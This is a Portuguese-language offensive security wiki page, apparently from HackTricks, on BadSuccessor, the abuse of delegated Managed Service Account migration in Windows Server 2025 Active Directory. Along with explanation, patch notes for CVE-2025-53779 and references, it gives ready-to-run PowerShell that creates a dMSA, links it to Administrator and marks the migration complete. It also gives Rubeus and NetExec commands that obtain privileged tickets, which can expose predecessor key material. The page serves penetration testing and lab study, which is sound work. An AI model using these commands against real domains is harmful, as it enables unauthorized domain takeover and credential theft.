# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Visão geral

**BadSuccessor** explora o workflow de migração de **delegated Managed Service Account** (**dMSA**) introduzido no **Windows Server 2025**. Uma dMSA pode ser vinculada a uma conta legada por meio de **`msDS-ManagedAccountPrecededByLink`** e avançar pelos estados de migração armazenados em **`msDS-DelegatedMSAState`**. Se um atacante puder criar uma dMSA em uma OU gravável e controlar esses atributos, o KDC poderá emitir tickets para a dMSA controlada pelo atacante com o **contexto de autorização da conta vinculada**.<sup>[[2]](#references)</sup>

Na prática, isso significa que um usuário com poucos privilégios que tenha apenas direitos delegados na OU pode criar uma nova dMSA, apontá-la para `Administrator`, concluir o estado de migração e então obter um TGT cujo PAC contenha grupos privilegiados, como **Domain Admins**.<sup>[[2]](#references)</sup>

## Detalhes da migração de dMSA relevantes

- dMSA é um recurso do **Windows Server 2025**.
- `Start-ADServiceAccountMigration` define a migração como estando no estado **started**.
- `Complete-ADServiceAccountMigration` define a migração como estando no estado **completed**.
- `msDS-DelegatedMSAState = 1` significa que a migração foi iniciada.
- `msDS-DelegatedMSAState = 2` significa que a migração foi concluída.
- Durante uma migração legítima, a dMSA deve substituir de forma transparente a conta suplantada, portanto o KDC/LSA preserva o acesso que a conta anterior já possuía.<sup>[[3]](#references)</sup>

A Microsoft Learn também observa que, durante a migração, a conta original é vinculada à dMSA e que a dMSA deve acessar aquilo que a conta antiga podia acessar.<sup>[[3]](#references)</sup> Essa é a premissa de segurança explorada pelo BadSuccessor.<sup>[[2]](#references)</sup>

## Requisitos

1. Um domínio onde **dMSA exista**, o que significa que há suporte ao **Windows Server 2025** no lado do AD.
2. O atacante pode **criar** objetos `msDS-DelegatedManagedServiceAccount` em alguma OU ou possui direitos equivalentes e amplos de criação de objetos filhos nela.
3. O atacante pode **escrever** os atributos relevantes da dMSA ou controlar totalmente a dMSA que acabou de criar.
4. O atacante pode solicitar tickets Kerberos a partir de um contexto ingressado no domínio ou de um tunnel que alcance LDAP/Kerberos.<sup>[[2]](#references)</sup>

### Verificações práticas

O sinal mais claro para o operador é verificar o nível do domínio/forest e confirmar que o ambiente já está usando a nova stack do Server 2025:
```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```
Se você encontrar valores como `Windows2025Domain` e `Windows2025Forest`, trate **BadSuccessor / dMSA migration abuse** como uma verificação prioritária.

Você também pode enumerar OUs graváveis delegadas para a criação de dMSAs com ferramentas públicas:<sup>[[1]](#references)</sup>
```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```
## Fluxo de abuso

1. Crie uma dMSA em uma OU onde você tenha direitos delegados de create-child.
2. Defina **`msDS-ManagedAccountPrecededByLink`** como o DN de um alvo privilegiado, como `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Defina **`msDS-DelegatedMSAState`** como `2` para marcar a migração como concluída.
4. Solicite um TGT para a nova dMSA e use o ticket retornado para acessar serviços privilegiados.<sup>[[2]](#references)</sup>

Exemplo em PowerShell:<sup>[[2]](#references)</sup>
```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Exemplos de solicitações de tickets / ferramentas operacionais:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```
## Por que isso é mais do que privilege escalation

Durante uma migração legítima, o Windows também precisa que o novo dMSA processe tickets emitidos para a conta anterior antes da mudança. É por isso que o material de tickets relacionado ao dMSA pode incluir chaves **atuais** e **anteriores** no fluxo **`KERB-DMSA-KEY-PACKAGE`**.<sup>[[2]](#references)</sup>

Para uma migração falsa controlada por um atacante, esse comportamento pode transformar o BadSuccessor em:<sup>[[2]](#references)</sup>

- **Privilege escalation** por meio da herança de SIDs de grupos privilegiados no PAC.
- **Exposição de material de credenciais**, porque o tratamento de chaves anteriores pode expor material equivalente ao hash RC4/NT do predecessor em workflows vulneráveis.

Isso torna a técnica útil tanto para um takeover direto do domínio quanto para operações subsequentes, como pass-the-hash ou comprometimento mais amplo de credenciais.

## Observações sobre o status do patch

O comportamento original do BadSuccessor **não é apenas um problema teórico de uma preview de 2025**. A Microsoft atribuiu a ele o **CVE-2025-53779** e publicou uma atualização de segurança em **agosto de 2025**.<sup>[[4]](#references)</sup> Mantenha este ataque documentado para:

- **labs / CTFs / exercícios de assume-breach**
- **ambientes Windows Server 2025 sem patch**
- **validação de delegações de OU e da exposição de dMSA durante assessments**

Não presuma que um domínio Windows Server 2025 é vulnerável apenas porque o dMSA existe; verifique o nível de patch e faça os testes cuidadosamente.

## Ferramentas

- [Ferramentas BadSuccessor da Akamai](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [Módulo `badsuccessor` do NetExec](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## Referências

- [1] [HTB: Eighteen - Abuso de dMSA do BadSuccessor para obter Domain Admin (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor: Abusando de dMSA para fazer privilege escalation no Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - Visão geral de Delegated Managed Service Accounts](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)

{{#include ../../../banners/hacktricks-training.md}}
